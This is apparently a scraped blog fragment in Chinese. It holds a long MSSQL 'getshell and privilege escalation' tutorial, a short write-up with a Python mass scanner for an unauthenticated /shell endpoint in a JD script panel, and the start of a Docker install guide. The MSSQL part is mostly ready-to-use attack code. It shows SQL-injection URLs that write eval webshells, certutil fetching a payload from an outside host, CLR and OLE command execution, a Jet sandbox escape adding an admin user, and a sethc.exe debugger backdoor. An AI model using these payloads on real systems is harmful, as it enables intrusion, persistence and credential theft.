不能读取数据库内用户表中的任何数据   public public角色不同于其它角色在于其权限可以被修改，每个数据库用户、角色或组都属于public数据库角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    登录账号和数据库用户 SQL Server的服务器和数据库是两个层次的概念，SQL Server的用户也分为两种，一种是服务器登陆账号，另一种是数据库用户。 一个人要操作SQL Server数据库，首先要为其创建服务器登陆账号，使得他可以登录到服务器上，然后还要在要操作的数据库上创建和这个登陆账号对应的数据库用户。 可以给登陆账号赋予相应权限，使得这个账号可以执行指定的管理服务器的任务。也可以给数据库用户赋予相应权限，使得这个数据库用户可以在这个数据库中执行指定的操作。 服务器登陆账号分为为Windows验证及SQL Server验证两种。\n Windows身份验证模式：把Windows的操作系统用户添加为SQL Server服务器登陆账号，SQL Server并不参与验证。SQL Server完全相信Windows的验证结果，所以用此方式登录SQL Server时并不需要提供密码。 SQL Server和Windows身份验证模式：这种模式即允许由Windows来验证主体身份，又允许SQL Server来验证主体身份，当由SQL Server验证主体身份时，需要用户名和密码来确认主体身份，和使用什么Windows账户半毛钱关系都没有，是在服务器上创建的另外一种独立账号。  getshell 能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。\n拿shell的两大前提就是\n 有相应的权限db_owner 知道web目录的绝对路径  我们先来了解下怎么去寻找web目录的绝对路径。\n寻找绝对路径  报错信息 字典猜 旁站的目录 存储过程来搜索 读配置文件  前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。\n先来看xp_dirtree直接举例子\nexecute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录\rexecute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件\r 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中，这样只需要去读取tmp表中的数据即可\nCREATE TABLE tmp (dir varchar(8000),num int,num1 int);\rinsert into tmp(dir,num,num1) execute master..xp_dirtree 'C:\\Users\\Administrator\\Desktop',1,1;\r 测试完成后记得删除tmp表\ndrop table tmp\r 我们再来看xp_cmdshell怎么去找绝对路径，实际上原理就是调用cmd来查找文件（如果可以执行命令，可以通过远程下载文件的方式下载木马）\nhttp://127.0.0.1/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));\rhttp://127.0.0.1/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i'\r xp_cmdshell拿shell xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径\nhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%^\u0026gt;^\u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%^\u0026gt; \u0026gt; c:\\\\WWW\\\\404.aspx' ;\r 由于cmd写webshell的主意这些转义的问题(所有的尖括号需要转义) 推荐使用certutil下载\n远程下载文件\rcertutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;\r命令：\rhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'certutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;' ;\r#加密\rcertutil -encode test.aspx out.txt\r解密\rcertutil -decode c:\\windows\\Temp\\out.txt c:\\wwwroot\\asp\\aspx.aspx\r1.首先在本地使用certutil加密，将加密后的内容复制出来\recho PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== \u0026gt; C:\\tmp\\shell.txt\r2.解密\rcertutil -f -decode \u0026quot;C:\\tmp\\shell.txt\u0026quot; \u0026quot;C:\\tmp\\shell.jsp\u0026quot;\r使用certutil下载文件有个弊端就是会产生缓存文件，用如下命令查看：\rcertutil -urlcache *\r执行删除缓存\rcertutil -urlcache * delete\r 差异备份拿shell backup database 库名 to disk = 'c:\\bak.bak';--\rcreate table [dbo].[test] ([cmd] [image]);\rinsert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;--\r log备份拿shell LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式\nalter database 库名 set RECOVERY FULL create table cmd (a image) backup log 库名 to disk = 'c:\\xxx' with init insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup log 库名 to disk = 'c:\\xxx\\2.asp'\r log备份的好处就是备份出来的webshell的文件大小非常的小\n提权 xpcmdshell提权  xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除\n 0x01 xp_cmdshell简介 xp``_cmdshell是Sql Server中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过xp``_cmdshell来进行提权\n影响范围：\n只要该数据库存在该组件，就可以利用\n0x02 xp_cmdshell使用 1. 查看xp_cmdshell状态 判断xpcmdshell权限\ndeclare @RunningOnACluster char(1)\rdeclare @xp_cmdshell_available char(1)\rdeclare @result int set @xp_cmdshell_available='Y' set @result=0\rselect @RunningOnACluster=case when convert(int, serverproperty('IsClustered')) = 1 then 'Y'\relse 'N' end if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))\rset @xp_cmdshell_available='N' if @RunningOnACluster='Y' begin\rif @xp_cmdshell_available='Y'\rselect @result=1\rif @xp_cmdshell_available='N'\rselect @result=2\rend\rselect @result\r 返回1表示xp_cmdshell组件启用，返回0则表示未启用。\n恢复xp_cmdshell存储过程\n解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。\r第一步先删除：\rdrop procedure sp_addextendedproc\rdrop procedure sp_oacreate\rexec sp_dropextendedproc 'xp_cmdshell'\r第二步恢复：\rdbcc addextendedproc(\u0026quot;sp_oacreate\u0026quot;,\u0026quot;odsole70.dll\u0026quot;)\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot; \u0026quot;)\r直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot;xplog70.dll\u0026quot;)\r代码判断一系列存储过程是否存在，若不存在则恢复。\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))\rdbcc addextendedproc ('xp_cmdshell','xplog70.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))\rdbcc addextendedproc ('xp_dirtree','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))\rdbcc addextendedproc ('xp_fixeddrives','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))\rdbcc addextendedproc ('xp_regwrite','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))\rdbcc addextendedproc ('xp_regread','xpstar.dll')\r 2.开启xp_cmdshell存储过程 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;\r 3.xp_cmdshell执行系统命令 xp_cmdshell执行whoami命令\nexec master.dbo.xp_cmdshell 'whoami'\rexec master.dbo.xp_cmdshell \u0026quot;whoami\u0026quot;\rexec xp_cmdshell \u0026quot;whoami\u0026quot;;\r 4.关闭xp_cmdshell存储过程 关闭xp_cmdshell配置\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\r 删除xp_cmdshell的语句:\nexec sp_dropextendedproc 'xp_cmdshell';\r 删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。\ndrop procedure xp_cmdshell;\rexec sp_addextendedproc \u0026quot;xp_cmdshell\u0026quot;, \u0026quot;xplog70.dll\u0026quot;;\r 附录\nexec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'\rexec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'\rexec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'\r 简单总结：\nxp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。\r启用：\rEXEC sp_configure 'show advanced options', 1\rRECONFIGURE;\rEXEC sp_configure 'xp_cmdshell', 1;\rRECONFIGURE;\r关闭：\rexec sp_configure 'show advanced options', 1;\rreconfigure;\rexec sp_configure 'xp_cmdshell', 0;\rreconfigure;\r删除：\rexec sp_dropextendedproc 'xp_cmdshell';\r执行：\rEXEC master.dbo.xp_cmdshell '命令'\r如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复\rexec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll'\r SP_OACREATE 0x01 sp_oacreate简介  调用wscript.shel执行命令\n sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。\n系统管理员使用sp_configure启用sp_oacreate和sp_oamethod系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）\n在效果方面，sp_oacreate、sp_oamethod两个过程和xp_cmdshell过程功能类似，因此可以替换使用！\n利用条件：\n 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）\n2.sqlserver允许远程连接\n3.OLE Automation Procedures选项开启\n 0x02 sp_oacreate使用 1.查看SP_OACREATE状态 我们可以在master.dbo.sysobjects中查看SP_OACREATE状态\nselect * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 2.判断SP_OACREATE是否存在 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 利用count(*)判断是否存在，存在即返回1。\n3.启用SP_OACREATE 利用sp_configure存储过程，启用SP_OACREATE\nexec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;\r 4.利用SP_OACREATE执行命令 利用SP_OACREATE执行系统命令\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r 此利用方法无回显\n5.关闭组件命令 exec sp_configure 'show advanced options',1;\rreconfigure;\rexec sp_configure 'Ole Automation Procedures',0;\rreconfigure;\r 简单总结\n判断SP_OACREATE是否存在\rselect count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r启用：\rEXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 关闭：\rEXEC sp_configure 'show advanced options', 1;\rRECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE WITH OVERRIDE; 执行：\rdeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。\r CLR提权 0x01 CLR简介 CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。\n更多概念详见下方官方链接：\nhttps://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15\n0x02 编写CLR 利用VS创建MSSQL数据库项目\n修改目标平台和勾选创建脚本\n在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：\nCREATE ASSEMBLY SQLCLRTest FROM 'C:\\MyDBApp\\SQLCLRTest.dll' WITH PERMISSION_SET = SAFE;\r 其权限集有三个选项：\nSAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。\nEXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。\nUNSAFE：允许使用任何代码。\n微软关于SQL CLR的详细文档可通过以下地址获得： https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration\n根据不同的数据库选择不同的.net，修改目标框架和权限级别为UNSAFE。\n创建SQL CLR C# 存储过程\n写入代码\nusing System;\rusing System.Data;\rusing System.Data.SqlClient;\rusing System.Data.SqlTypes;\rusing System.Diagnostics;\rusing System.Text;\rusing Microsoft.SqlServer.Server;\rpublic partial class StoredProcedures\r{\r[Microsoft.SqlServer.Server.SqlProcedure]\rpublic static void ExecCommand (string cmd)\r{\r// 在此处放置代码\rSqlContext.Pipe.Send(\u0026quot;Command is running, please wait.\u0026quot;);\rSqlContext.Pipe.Send(RunCommand(\u0026quot;cmd.exe\u0026quot;, \u0026quot; /c \u0026quot; + cmd));\r}\rpublic static string RunCommand(string filename,string arguments)\r{\rvar process = new Process();\rprocess.StartInfo.FileName = filename;\rif (!string.IsNullOrEmpty(arguments))\r{\rprocess.StartInfo.Arguments = arguments;\r}\rprocess.StartInfo.CreateNoWindow = true;\rprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\rprocess.StartInfo.UseShellExecute = false;\rprocess.StartInfo.RedirectStandardError = true;\rprocess.StartInfo.RedirectStandardOutput = true;\rvar stdOutput = new StringBuilder();\rprocess.OutputDataReceived += (sender, args) =\u0026gt; stdOutput.AppendLine(args.Data);\rstring stdError = null;\rtry\r{\rprocess.Start();\rprocess.BeginOutputReadLine();\rstdError = process.StandardError.ReadToEnd();\rprocess.WaitForExit();\r}\rcatch (Exception e)\r{\rSqlContext.Pipe.Send(e.Message);\r}\rif (process.ExitCode == 0)\r{\rSqlContext.Pipe.Send(stdOutput.ToString());\r}\relse\r{\rvar message = new StringBuilder();\rif (!string.IsNullOrEmpty(stdError))\r{\rmessage.AppendLine(stdError);\r}\rif (stdOutput.Length != 0)\r{\rmessage.AppendLine(\u0026quot;Std output:\u0026quot;);\rmessage.AppendLine(stdOutput.ToString());\r}\rSqlContext.Pipe.Send(filename + arguments + \u0026quot; finished with exit code = \u0026quot; + process.ExitCode + \u0026quot;: \u0026quot; + message);\r}\rreturn stdOutput.ToString();\r}\r}\r 编译成功后\n将以下文件保存为dll.ps1(需要修改dll路径)\n$assemblyFile = \u0026quot;C:\\Users\\Administrator\\Desktop\\dll\\sysinfo.dll\u0026quot;\r$stringBuilder = New-Object -Type System.Text.StringBuilder\r$stringBuilder.AppendLine(\u0026quot;use msdb;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;alter database master set trustworthy on;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\u0026quot;) | Out-Null\r$stringBuilder.Append(\u0026quot;CREATE ASSEMBLY [sysinfo] AUTHORIZATION [dbo] FROM `n0x\u0026quot;) | Out-Null\r$fileStream = [IO.File]::OpenRead($assemblyFile) while (($byte = $fileStream.ReadByte()) -gt -1) { $stringBuilder.Append($byte.ToString(\u0026quot;X2\u0026quot;)) | Out-Null }\r$stringBuilder.AppendLine(\u0026quot;`n WITH PERMISSION_SET = UNSAFE;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec dbo.ExecCommand 'whoami /all';\u0026quot;) | Out-Null $stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.ToString() -join \u0026quot;\u0026quot; | Out-File C:\\Users\\Administrator\\Desktop\\dll\\exec.txt\r 输入以下命令，生成提权用到的命令，运行完成后在当前目录生成exec.txt文件（该脚本用于生成提权语句，将dll转成16进制，通过这种方式文件不落地。）\npwershell -exec bypass ./dll.ps1\r 打开可看到提权SQL语句，分别运行每一条SQL语句\n进入msdb数据库\nuse msdb;\r 0x03 将存储.Net程序集的数据库配置为可信赖的。 alter database master set trustworthy on;\r 0x04 启用MSSQL CLR功能 exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\r命令解释：\rexec sp_configure 'show advanced options',1; #显示高级选项：\rreconfigure; #重新配置\rexec sp_configure 'clr enabled',1; # 开启clr enabled 选项\rreconfigure; #重新配置\r--关闭所有服务器配置选项\rEXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE\r--如果存在权限问题，执行下面一段脚本\ralter database [master] set TRUSTWORTHY on\rEXEC sp_changedbowner 'sa'\r 0x05 利用SQL语句导入程序集 CREATE ASSEMBLY [Database1]\rAUTHORIZATION [dbo]\rFROM 0x0000\rWITH PERMISSION_SET = UNSAFE;\rGO\r 0x06 创建存储过程 CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\r 0x07 执行命令 执行系统命令，查看当前的权限\nexec dbo.ExecCommand 'whoami';\r 沙盒提权 什么是沙盒？\n沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。\n利用前提：\n 1.需要Microsoft.Jet.OLEDB.4.0一般在32位系统才可以，64位机需要12.0，较复杂\n2.dnary.mdb和ias.mdb两个文件 在win2003上默认存在，也可自行准备\n 提权操作\n简单总结\n--提权语句\rexec sp_configure 'show advanced options',1;reconfigure;\r-- 不开启的话在执行xp_regwrite会提示让我们开启，\rexec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;\r--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。\rexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;\r--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。\rexec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode'\r--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net user margin margin /add\u0026quot;)')\rselect * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net localgroup administrators margin /add\u0026quot;)')\r沙盒模式SandBoxMode参数含义（默认是2）\r`0`：在任何所有者中禁止启用安全模式\r`1` ：为仅在允许范围内\r`2` ：必须在access模式下\r`3`：完全开启\ropenrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。\r--恢复配置\r--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1;\r--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;\r--exec sp_configure 'show advanced options',0;reconfigure;\r 引用前辈们的话\n 1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令\n 利用镜像劫持提权 0x01 简介 通过使用xp_regwrite存储过程对注册表进行修改，替换成任意值，造成镜像劫持。\n前提条件：\n 1.未禁止注册表编辑（即写入功能）\n2.xp_regwrite启用\n 0x02 映像劫持提权 1.查看xp_regwrite是否启用 select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'\r 返回1表示xp_regwrite组件启用 返回0则表示未启用\n2.xp_regwrite开启与关闭 EXEC sp_configure 'show advanced options', 1\rRECONFIGURE\rEXEC sp_configure 'xp_regwrite',1\rRECONFIGURE\r 3.利用regwrite函数修改组注册表进行劫持 首先我们利用regwrite函数修改组册表进行劫持，这里如果regwrite执行失败参考上面的开启方法。\nEXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\\windows\\system32\\cmd.exe'\r 4.查看是否劫持成功 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','Debugger'\r 5.验证是否成功 紧接着我们远程连接桌面，然后连续按5次shift就可以调用cmd窗口\n拓展：\n上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作\n6.删除指定注册表键值 删除粘滞键的键值\nxp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'\r 利用Agent Job执行命令 0x01 简介 SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务，这些任务在SQL Server 2019（15.x）中称为作业。\n原理：创建一个任务并执行命令，命令执行后的结果，将结果写入文件中。\nJob执行命令 1.启动sqlagent服务 首先需要启动sqlagent服务：\nexec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'\r 2.进入数据库 USE msdb;  3.定义创建作业 EXEC dbo.sp_add_job @job_name = N'test_powershell_job1';  4.定义作业步骤 定义作业步骤(作业中查看当前用户并将用户写入c:\\1.txt文件中)\nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\\windows\\system32\\cmd.exe /c whoami \u0026gt;c:\\\\1.txt', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';  5.启动作业 启动作业（启动作业需要一点时间，作业完成后会在c盘目录下新建），如果命令没有执行成功多运行几次即可。\nEXEC dbo.sp_start_job N'test_powershell_job1';\r 6.验证是否成功 参考地址：\nhttps://www.freebuf.com/vuls/276814.html\rhttps://y4er.com/post/mssql-getshell/\rhttps://f5.pm/go-26046.html\rhttp://alexsel.com/index.php/archives/80/\rhttps://xz.aliyun.com/t/9475\r ","id":18,"section":"posts","summary":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整","tags":["MSSQL","MSSQL提权"],"title":"MSSQL获取shell和提权","uri":"https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/","year":"2021"},{"content":"0x01 漏洞检测 漏洞payload: http://IP/shell\n0x02 漏洞验证 在server.js代码中, 使用了在线的shell控制台, 该控制台未进行鉴权, 导致存在未授权访问\n通过该漏洞获取容器中的root权限, 可通过容器逃逸获取宿主机权限\n读取的京东cookie\n以下为批量脚本, 代码比较粗糙,大佬勿喷\n# -*- coding: utf-8 -*-\r# @Time : 2021/6/30 9:07\r# @Author : AD钙奶\rimport json\rimport re\rimport time\rimport requests\rimport ssl\rimport threadpool\rfrom loguru import logger\rtry:\rrequests.packages.urllib3.disable_warnings()\r_create_unverified_https_context = ssl._create_unverified_context\rexcept AttributeError:\rpass\relse:\rssl._create_default_https_context = _create_unverified_https_context\rdef brute_force(_url):\rurls = _url + '/shell'\rheaders = {\r\u0026quot;Accept\u0026quot;: \u0026quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026quot;,\r\u0026quot;Accept-Encoding\u0026quot;: \u0026quot;gzip, deflate\u0026quot;,\r\u0026quot;Accept-Language\u0026quot;: \u0026quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026quot;,\r\u0026quot;Cache-Control\u0026quot;: \u0026quot;max-age=0\u0026quot;,\r\u0026quot;Connection\u0026quot;: \u0026quot;keep-alive\u0026quot;,\r\u0026quot;Cookie\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;Upgrade-Insecure-Requests\u0026quot;: \u0026quot;1\u0026quot;,\r\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59\u0026quot;,\r}\rtry:\rresp = requests.get(url=urls, headers=headers, timeout=20)\rif resp.status_code == 200 and resp.headers['Set-Cookie']:\rinfo1 = f\u0026quot;系统存在未授权漏洞，存在漏洞的网站: {str(urls)}\u0026quot;\rfilename1 = time.strftime(\u0026quot;%Y-%m-%d-\u0026quot;) + 'vuln_存在未授权.txt'\rsave_vuln(filename1, info1)\rlogger.info(info1)\rexcept Exception as e:\rpass\rdef save_vuln(filename, info1):\rfile_path = './result/' + filename\rwith open(file_path, \u0026quot;a\u0026quot;) as f:\rinfo1 = info1 + '\\n'\rf.write(info1)\rdef open_file():\rwith open(\u0026quot;url3.txt\u0026quot;, 'r', encoding='UTF-8') as f:\rurls = f.readlines()\rurls = [url.strip() for url in urls if url and url.strip()]\rreturn urls\rdef main():\rurl = open_file()\rpool = threadpool.ThreadPool(200)\rthread = threadpool.makeRequests(brute_force, url)\r[pool.putRequest(req) for req in thread]\rpool.wait()\rif __name__ == '__main__':\rmain()\r ","id":19,"section":"posts","summary":"0x01 漏洞检测 漏洞payload: http://IP/shell 0x02 漏洞验证 在server.js代码中, 使用了在线的shell控制台, 该控制台未进行鉴权, 导致存在未授权访问 通","tags":["漏洞复现","web安全"],"title":"JD羊毛脚本漏洞","uri":"https://ad-calcium.github.io/2021/07/jd%E7%BE%8A%E6%AF%9B%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"1.下载docker-19.03.8.tgz\nwget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz\r 2.解压 docker-19.03.8.tgz\ntar -xvf docker-19.03.8.tgz\r 复制  sudo cp docker/* /usr/bin/\r 4.复制一下内容到 vim /etc/systemd/system/docker.service\n\r[Unit]\rDescription=Docker Application Container Engine\rDocumentation=https://docs.docker.com\rAfter=network-online.target firewalld.service\rWants=network-online.target\r[Service]\rType=notify\r# the default is not to use systemd for cgroups because the delegate issues still\r# exists and systemd currently does not support the cgroup feature set required\r# for containers run by docker\rExecStart=/usr/bin/dockerd\rExecReload=/bin/kill -s HUP $MAINPID\r# Having non-zero Limit*s causes performance problems due to accounting overhead\r# in the kernel. We recommend using cgroups to do container-local accounting.\rLimitNOFILE=infinity\rLimitNPROC=infinity\rLimitCORE=infinity\r# Uncomment TasksMax if your systemd version supports it.\r# Only systemd 226 and above support this version.\r#TasksMax=infinity\rTimeoutStartSec=0\r# set delegate yes so that systemd does not reset the cgroups of docker containers\rDelegate=yes\r# kill only the docker process, not all processes in the cgroup\rKillMode=process\r# restart the docker process if it exits prematurely\rRestart=on-failure\rStartLimitBurst=3\rStartLimitInterval=60s\r[Install]\rWantedBy=multi-user.target\r 5.加载文件 使其生效\nsystemctl daemon-reload  